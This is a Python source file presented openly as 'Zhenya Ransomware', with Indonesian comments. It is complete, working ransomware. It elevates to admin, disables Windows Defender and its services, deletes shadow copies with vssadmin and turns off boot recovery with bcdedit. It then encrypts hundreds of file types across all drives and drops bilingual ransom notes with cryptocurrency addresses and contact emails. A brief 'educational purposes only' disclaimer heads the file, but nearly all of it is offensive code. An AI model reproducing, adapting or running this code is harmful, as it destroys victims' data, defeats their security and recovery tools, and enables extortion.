#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Zhenya Ransomware - Modifikasi dari file encryptor biasa
# Peringatan: Hanya untuk tujuan edukasi. Penggunaan ilegal dilarang.

import pathlib
import secrets
import os
import base64
import getpass
import sys
import time
import threading
import subprocess
import platform
import ctypes
import random
from datetime import datetime

import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

# ===================== FUNGSI ASLI (TIDAK DIUBAH) =====================
def generate_salt(size=16):
    """Generate the salt used for key derivation, 
    `size` is the length of the salt to generate"""
    return secrets.token_bytes(size)

def derive_key(salt, password):
    """Derive the key from the `password` using the passed `salt`"""
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())

def load_salt():
    # load salt from salt.salt file
    return open("salt.salt", "rb").read()

def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    """Generates a key from a `password` and the salt.
    If `load_existing_salt` is True, it'll load the salt from a file
    in the current directory called "salt.salt".
    If `save_salt` is True, then it will generate a new salt
    and save it to "salt.salt" """
    if load_existing_salt:
        # load existing salt
        salt = load_salt()
    elif save_salt:
        # generate new salt and save it
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)

def encrypt(filename, key):
    """Given a filename (str) and key (bytes), it encrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def encrypt_folder(foldername, key):
    # if it's a folder, encrypt the entire folder (i.e all the containing files)
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}")
            # encrypt the file
            encrypt(child, key)
        elif child.is_dir():
            # if it's a folder, encrypt the entire folder by calling this function recursively
            encrypt_folder(child, key)

def decrypt(filename, key):
    """Given a filename (str) and key (bytes), it decrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid token, most likely the password is incorrect")
        return
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def decrypt_folder(foldername, key):
    # if it's a folder, decrypt the entire folder
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Decrypting {child}")
            # decrypt the file
            decrypt(child, key)
        elif child.is_dir():
            # if it's a folder, decrypt the entire folder by calling this function recursively
            decrypt_folder(child, key)

# ===================== TAMBAHAN FUNGSI UNTUK RANSOMWARE =====================
# Konfigurasi tetap
PASSWORD = "abisayangretaselamanya"          # Password tetap
SALT = b'ZhenyaRansomwareSalt2026'           # Salt tetap (16 byte)
BTC_ADDRESS = "bc1qvd00grpp3kea4nlgexvv7ktam62fv9lepfyt6w"
ETH_ADDRESS = "0x81830DF553d62bE793c3E7dC0184d8F3728b33F3"
EMAIL1 = "hamzahcorp@protonmail.com"
EMAIL2 = "retaabi58@gmail.com"
RANSOM_AMOUNT = "10.000.000 IDR (atau setara 0.05 BTC / 0.8 ETH)"  # Perkiraan
README_FILENAME = "README_ZHENYA.txt"
ENCRYPTED_EXT = ".Zhenya"  # Ekstensi file terenkripsi

# Ekstensi file yang akan dienkripsi (dokumen, gambar, video, audio, arsip, kode, dll) - SUPER LENGKAP
TARGET_EXTENSIONS = {
    # Dokumen
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.rtf', '.odt',
    '.ods', '.odp', '.odg', '.odf', '.sxw', '.sxc', '.sxi', '.sxd', '.stw', '.stc', '.sti', '.std',
    '.wpd', '.wps', '.wks', '.dbf', '.dif', '.slk', '.wb2', '.wq1', '.wk1', '.wk3', '.wk4',
    '.qpw', '.xlr', '.xlt', '.xlm', '.xlc', '.xlw', '.xla', '.xlam', '.xll', '.xltm', '.xltx',
    '.docm', '.dot', '.dotm', '.dotx', '.pot', '.potm', '.potx', '.ppa', '.ppam', '.pps', '.ppsm',
    '.ppsx', '.pptm', '.sldm', '.sldx', '.thmx',
    '.pages', '.numbers', '.key', '.rtfd',
    '.tex', '.latex', '.bib', '.bst', '.cls', '.sty',
    '.abw', '.cwk', '.hwp', '.mobi', '.azw', '.azw3', '.epub', '.ibook', '.opf', '.fb2', '.lit',
    '.pdb', '.prc', '.tr3', '.tr2', '.pwi', '.pwd', '.puz',
    # Gambar
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif', '.svg', '.ico',
    '.psd', '.ai', '.cdr', '.dwg', '.dxf', '.eps', '.raw', '.cr2', '.nef', '.orf', '.sr2',
    '.arw', '.dng', '.pef', '.rw2', '.3fr', '.fff', '.x3f', '.mef', '.mos', '.mrw', '.nrw',
    '.ptx', '.pxn', '.r3d', '.raf', '.srw', '.xpm', '.pbm', '.pgm', '.ppm', '.pnm', '.pcx',
    '.tga', '.exr', '.hdr', '.wbmp', '.webp', '.jps', '.pns', '.jpe', '.jfif', '.jfi',
    '.jp2', '.j2k', '.jpf', '.jpx', '.jpm', '.mj2',
    # Video
    '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.mpeg', '.mpg', '.m4v',
    '.3gp', '.3g2', '.ogv', '.ogg', '.ogm', '.rm', '.rmvb', '.asf', '.asx', '.amv',
    '.m2v', '.m4p', '.m4b', '.m4r', '.mp2', '.mpe', '.mpv2', '.vob', '.ts', '.mts',
    '.m2ts', '.qt', '.divx', '.xvid', '.bik', '.mk3d', '.webm',
    # Audio
    '.mp3', '.wav', '.flac', '.aac', '.ogg', '.m4a', '.wma', '.ape', '.ac3', '.dts',
    '.mid', '.midi', '.rmi', '.kar', '.mka', '.mpa', '.ra', '.ram', '.m3u', '.pls',
    '.asx', '.wpl', '.cue', '.aiff', '.aif', '.aifc', '.au', '.snd', '.cda', '.dct',
    '.vqf', '.voc', '.mod', '.s3m', '.it', '.xm', '.mtm', '.umx',
    # Arsip
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.lz', '.lzma', '.lzo',
    '.z', '.Z', '.tgz', '.tbz2', '.tlz', '.txz', '.zst', '.br', '.bz', '.cab',
    '.arj', '.lzh', '.lha', '.ace', '.uue', '.yenc', '.hqx', '.sit', '.sitx', '.dmg',
    '.iso', '.img', '.vhd', '.vhdx', '.vmdk', '.ova', '.ovf', '.qcow2',
    # Database
    '.sql', '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.mdf', '.ldf', '.ndf',
    '.dbf', '.fdb', '.gdb', '.pdb', '.edb', '.nsf', '.ntf', '.kdb', '.kdbx', '.kde',
    '.dbs', '.db3', '.dbk', '.dbx', '.dsk', '.dsn', '.eco', '.eco', '.edb', '.epim',
    '.frm', '.ibd', '.myi', '.myd', '.opt', '.trg', '.trn',
    # Kode / Developer
    '.py', '.pyc', '.pyo', '.pyw', '.pyx', '.pxd', '.pxi', '.rpy', '.rb', '.rbw',
    '.php', '.php3', '.php4', '.php5', '.phps', '.phpt', '.phtml', '.asp', '.aspx',
    '.asax', '.ascx', '.ashx', '.asmx', '.aspx.cs', '.aspx.vb', '.jsp', '.jspx',
    '.do', '.action', '.pl', '.pm', '.t', '.psgi', '.cgi', '.fcgi', '.java', '.jar',
    '.class', '.scala', '.clj', '.groovy', '.kt', '.kts', '.swift', '.m', '.mm',
    '.cpp', '.cxx', '.cc', '.c', '.h', '.hpp', '.hxx', '.hh', '.s', '.asm', '.o',
    '.obj', '.so', '.dylib', '.dll', '.exe', '.msi', '.bin', '.sh', '.bash', '.zsh',
    '.ps1', '.psm1', '.psd1', '.vbs', '.vbe', '.js', '.jse', '.jsx', '.ts', '.tsx',
    '.coffee', '.lua', '.pl', '.pm', '.t', '.r', '.R', '.rmd', '.ipynb', '.jl',
    '.go', '.rs', '.erl', '.hrl', '.beam', '.elixir', '.ex', '.exs', '.leex', '.eex',
    '.heex', '.php', '.phtml', '.twig', '.blade.php', '.vue', '.svelte', '.less',
    '.scss', '.sass', '.styl', '.css', '.html', '.htm', '.xhtml', '.xml', '.xsl',
    '.xslt', '.xsd', '.wsdl', '.json', '.yaml', '.yml', '.toml', '.ini', '.cfg',
    '.conf', '.config', '.properties', '.env', '.bashrc', '.zshrc', '.profile',
    '.gitignore', '.dockerignore', '.htaccess', '.htpasswd',
    # Sertifikat & Keamanan
    '.key', '.pem', '.crt', '.cer', '.der', '.p12', '.pfx', '.pkcs12', '.jks',
    '.keystore', '.kdb', '.kdbx', '.ovpn',
    # Lainnya
    '.log', '.bak', '.backup', '.old', '.orig', '.tmp', '.temp', '.swp', '.swo',
    '.lock', '.pid', '.cache', '.crdownload', '.part', '.download', '.!ut', '.!qb',
    '.opdownload', '.opendownload', '.offline', '.torrent', '.magnet',
    '.eml', '.msg', '.pst', '.ost', '.dbx', '.mbx', '.mbox', '.vcf', '.vcard',
    '.ics', '.vcs', '.wri', '.wpd', '.wps', '.xps', '.oxps', '.epub', '.mobi',
    '.azw', '.azw3', '.cbr', '.cbz', '.chm', '.hlp', '.qch', '.qph',
    '.blend', '.max', '.mb', '.ma', '.c4d', '.skp', '.3dm', '.3ds', '.obj', '.fbx',
    '.stl', '.ply', '.dxf', '.dae', '.iges', '.igs', '.step', '.stp', '.x_t', '.x_b',
    '.sldprt', '.sldasm', '.slddrw', '.CATPart', '.CATProduct', '.CATDrawing',
    '.asf', '.asx', '.wmf', '.emf', '.wmz', '.wmd', '.wms', '.wmx', '.wvx',
}

# Folder yang TIDAK akan disentuh (sistem) - diperluas
EXCLUDED_DIRS = {
    'Windows', 'winnt', 'Program Files', 'Program Files (x86)', 'ProgramData',
    'System32', 'System Volume Information', '$Recycle.Bin', 'Boot', 'Recovery',
    'AppData', 'Application Data', 'All Users', 'Default', 'Public',
    'Microsoft', 'WindowsApps', 'Windows Defender', 'Windows NT',
    'temp', 'tmp', 'winrar', '7-Zip', 'Google', 'Mozilla', 'Adobe',
    'Microsoft Office', 'Office', 'Intel', 'AMD', 'NVIDIA', 'Drivers',
    'config', 'system32', 'syswow64', 'WinSxS', 'Installer', 'MSOCache',
    'PerfLogs', 'Recovery', 'System', 'system', 'System32', 'SysWOW64',
    'AppData', 'Local Settings', 'Cookies', 'History', 'Temp', 'Temporary Internet Files',
    'Cache', 'IconCache', 'Thumbs.db', 'desktop.ini', 'folder.jpg',
    'boot', 'grub', 'etc', 'var', 'proc', 'dev', 'sys', 'root', 'home',
    '.cache', '.config', '.local', '.mozilla', '.thunderbird',
}

# Kunci global (diturunkan dari password tetap dan salt tetap)
KEY = derive_key(SALT, PASSWORD)
KEY_B64 = base64.urlsafe_b64encode(KEY)  # Fernet butuh base64 key

def encrypt_file(file_path: pathlib.Path) -> bool:
    """Mengenkripsi satu file dengan Fernet, lalu menambahkan ekstensi .Zhenya"""
    try:
        # Lewati jika sudah memiliki ekstensi .Zhenya (sudah terenkripsi)
        if file_path.suffix.lower() == ENCRYPTED_EXT.lower():
            return False
        with open(file_path, 'rb') as f:
            data = f.read()
        fernet = Fernet(KEY_B64)
        encrypted = fernet.encrypt(data)
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        # Rename dengan ekstensi .Zhenya
        new_path = file_path.with_suffix(file_path.suffix + ENCRYPTED_EXT)
        file_path.rename(new_path)
        return True
    except Exception:
        return False

def is_target_file(file_path: pathlib.Path) -> bool:
    """Cek apakah file memiliki ekstensi yang ditargetkan"""
    return file_path.suffix.lower() in TARGET_EXTENSIONS

def is_excluded_dir(dir_path: pathlib.Path) -> bool:
    """Cek apakah folder termasuk yang dikecualikan"""
    for part in dir_path.parts:
        if part in EXCLUDED_DIRS:
            return True
    return False

def get_all_drives() -> list:
    """Mendapatkan daftar drive di Windows (C:, D:, dll)"""
    drives = []
    if platform.system() == 'Windows':
        import string
        for letter in string.ascii_uppercase:
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                drives.append(drive)
    return drives

def get_all_files(root_path: str) -> list:
    """Mengumpulkan semua file target dari root_path secara rekursif"""
    all_files = []
    try:
        for root, dirs, files in os.walk(root_path):
            # Hapus folder yang dikecualikan dari pencarian
            dirs[:] = [d for d in dirs if d not in EXCLUDED_DIRS]
            # Lewati jika folder root termasuk excluded
            if is_excluded_dir(pathlib.Path(root)):
                continue
            for file in files:
                full_path = pathlib.Path(root) / file
                if is_target_file(full_path):
                    all_files.append(full_path)
    except Exception:
        pass
    return all_files

def encrypt_files_multithread(file_list: list, max_threads=100):
    """Enkripsi file dengan multi-threading"""
    if not file_list:
        return
    total = len(file_list)
    done = 0
    lock = threading.Lock()
    
    def worker(files):
        nonlocal done
        for f in files:
            if encrypt_file(f):
                with lock:
                    done += 1
                    if done % 100 == 0:
                        print(f"[+] Progress: {done}/{total} file terenkripsi")
            time.sleep(0.01)  # kecil untuk memberi kesempatan thread lain

    # Bagi file ke thread
    chunk_size = max(1, total // max_threads)
    threads = []
    for i in range(0, total, chunk_size):
        chunk = file_list[i:i+chunk_size]
        t = threading.Thread(target=worker, args=(chunk,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def disable_windows_defender():
    """Menonaktifkan Windows Defender melalui PowerShell (butuh admin)"""
    try:
        # Minta hak admin jika belum
        if platform.system() == 'Windows' and ctypes.windll.shell32.IsUserAnAdmin() == 0:
            # Relaunch sebagai admin
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
        # Jalankan perintah PowerShell
        ps_commands = [
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "Set-MpPreference -DisableBehaviorMonitoring $true",
            "Set-MpPreference -DisableBlockAtFirstSeen $true",
            "Set-MpPreference -DisableIOAVProtection $true",
            "Set-MpPreference -DisablePrivacyMode $true",
            "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
            "Set-MpPreference -DisableArchiveScanning $true",
            "Set-MpPreference -DisableIntrusionPreventionSystem $true",
            "Set-MpPreference -DisableScriptScanning $true",
            "Set-MpPreference -SubmitSamplesConsent 2",
            "Set-MpPreference -PUAProtection 0",
            "Set-MpPreference -HighThreatDefaultAction 6",  # Allow
            "Set-MpPreference -ModerateThreatDefaultAction 6",
            "Set-MpPreference -LowThreatDefaultAction 6",
            "Set-MpPreference -SevereThreatDefaultAction 6",
        ]
        for cmd in ps_commands:
            subprocess.run(["powershell", "-Command", cmd], capture_output=True)
        # Matikan service
        subprocess.run(["sc", "stop", "WinDefend"], capture_output=True)
        subprocess.run(["sc", "config", "WinDefend", "start=disabled"], capture_output=True)
        # Matikan juga service terkait
        subprocess.run(["sc", "stop", "Sense"], capture_output=True)  # Windows Defender Advanced Threat Protection
        subprocess.run(["sc", "config", "Sense", "start=disabled"], capture_output=True)
        print("[!] Windows Defender dan layanan keamanan dinonaktifkan.")
    except Exception as e:
        print(f"[!] Gagal menonaktifkan Defender: {e}")

def create_readme_files():
    """Membuat file README di root setiap drive, desktop, dan folder umum"""
    readme_content = f"""
                ZHENYA RANSOMWARE - PENTING!

------------------------------------------------------------
SELURUH DATA ANDA TELAH DIENKRIPSI!

File-file penting Anda (dokumen, foto, video, database, dll) telah kami enkripsi menggunakan algoritma AES-256 yang tidak dapat dipulihkan tanpa kunci khusus. Semua file yang terkena memiliki ekstensi .Zhenya.

UNTUK MENDAPATKAN KEMBALI DATA ANDA, ANDA HARUS MEMBAYAR TEbusan sebesar {RANSOM_AMOUNT} ke salah satu alamat berikut:

Bitcoin  (BTC): {BTC_ADDRESS}
Ethereum (ETH): {ETH_ADDRESS}

Setelah pembayaran, kirim bukti transfer ke email berikut:
1. {EMAIL1}
2. {EMAIL2}

Kami akan merespon dalam 24 jam dan mengirimkan dekriper beserta instruksi.

Jangan coba-coba memulihkan sendiri, karena justru akan merusak data. Jangan hubungi polisi, karena tidak akan membantu.

------------------------------------------------------------
ALL YOUR DATA HAS BEEN ENCRYPTED!

Your important files (documents, photos, videos, databases, etc.) have been encrypted using AES-256 algorithm which cannot be recovered without a special key. All affected files have the .Zhenya extension.

TO GET YOUR DATA BACK, YOU MUST PAY A RANSOM OF {RANSOM_AMOUNT} to one of the following addresses:

Bitcoin  (BTC): {BTC_ADDRESS}
Ethereum (ETH): {ETH_ADDRESS}

After payment, send proof of transfer to:
1. {EMAIL1}
2. {EMAIL2}

We will respond within 24 hours and send the decrypter with instructions.

Do not try to recover yourself, as it will damage the data. Do not contact the police, it won't help.

Zhenya Ransomware
"""
    # Desktop
    desktop = pathlib.Path.home() / "Desktop"
    if desktop.exists():
        try:
            with open(desktop / README_FILENAME, 'w', encoding='utf-8') as f:
                f.write(readme_content)
        except:
            pass
    # Root setiap drive
    for drive in get_all_drives():
        try:
            with open(pathlib.Path(drive) / README_FILENAME, 'w', encoding='utf-8') as f:
                f.write(readme_content)
        except:
            pass
    # Juga di folder saat ini
    try:
        with open(pathlib.Path.cwd() / README_FILENAME, 'w', encoding='utf-8') as f:
            f.write(readme_content)
    except:
        pass
    # Di folder user Documents, Pictures, dll
    user_dirs = [
        pathlib.Path.home() / "Documents",
        pathlib.Path.home() / "Pictures",
        pathlib.Path.home() / "Videos",
        pathlib.Path.home() / "Music",
        pathlib.Path.home() / "Downloads",
        pathlib.Path.home() / "OneDrive",
    ]
    for d in user_dirs:
        if d.exists():
            try:
                with open(d / README_FILENAME, 'w', encoding='utf-8') as f:
                    f.write(readme_content)
            except:
                pass
    return readme_content

def show_red_message(message):
    """Menampilkan teks dengan warna merah di terminal Windows (ANSI)"""
    # Aktifkan ANSI di Windows 10+
    os.system('')
    print(f"\033[91m{message}\033[0m")

def delete_shadow_copies():
    """Menghapus shadow copies (Volume Shadow Copies) agar tidak bisa restore"""
    try:
        subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], capture_output=True)
        print("[!] Shadow copies dihapus.")
    except:
        pass

def disable_recovery_options():
    """Menonaktifkan opsi pemulihan sistem"""
    try:
        subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", "No"], capture_output=True)
        subprocess.run(["bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures"], capture_output=True)
        print("[!] Opsi pemulihan sistem dinonaktifkan.")
    except:
        pass

# ===================== MAIN BARU (RANSOMWARE) =====================
if __name__ == "__main__":
    # Minta hak admin jika belum (untuk nonaktifkan defender dan akses semua file)
    if platform.system() == 'Windows' and ctypes.windll.shell32.IsUserAnAdmin() == 0:
        # Relaunch sebagai admin
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    # Nonaktifkan Windows Defender dan layanan keamanan
    disable_windows_defender()

    # Hapus shadow copies dan nonaktifkan recovery
    delete_shadow_copies()
    disable_recovery_options()

    # Buat file README di berbagai lokasi
    readme = create_readme_files()

    # Tampilkan pesan tebusan di terminal dengan warna merah
    show_red_message(readme)

    # Kumpulkan semua file dari semua drive
    all_files = []
    drives = get_all_drives()
    for drive in drives:
        print(f"[*] Mengumpulkan file dari {drive}...")
        files = get_all_files(drive)
        all_files.extend(files)
        print(f"[+] Ditemukan {len(files)} file di {drive}")

    # Juga tambahkan folder user (mungkin tidak tercakup jika di drive berbeda)
    user_folders = [
        str(pathlib.Path.home() / "Documents"),
        str(pathlib.Path.home() / "Pictures"),
        str(pathlib.Path.home() / "Videos"),
        str(pathlib.Path.home() / "Music"),
        str(pathlib.Path.home() / "Downloads"),
        str(pathlib.Path.home() / "Desktop"),
        str(pathlib.Path.home() / "OneDrive"),
    ]
    for folder in user_folders:
        if os.path.exists(folder):
            print(f"[*] Mengumpulkan file dari {folder}...")
            files = get_all_files(folder)
            all_files.extend(files)
            print(f"[+] Ditemukan {len(files)} file di {folder}")

    # Hapus duplikat (jika ada)
    all_files = list(set(all_files))
    total_files = len(all_files)
    print(f"[!] Total file target: {total_files}")

    if total_files == 0:
        print("[!] Tidak ada file yang ditemukan untuk dienkripsi.")
    else:
        # Enkripsi semua file dengan multithreading
        print("[*] Memulai enkripsi...")
        encrypt_files_multithread(all_files, max_threads=100)
        print("[+] Enkripsi selesai!")

    # Tampilkan pesan lagi setelah selesai
    show_red_message("\n" + "="*60)
    show_red_message("ENKRIPSI SELESAI! Data Anda telah disandera.")
    show_red_message("Baca README_ZHENYA.txt di desktop atau root drive.")
    show_red_message("="*60)

    # Biarkan terminal terbuka
    input("\nTekan Enter untuk keluar...")
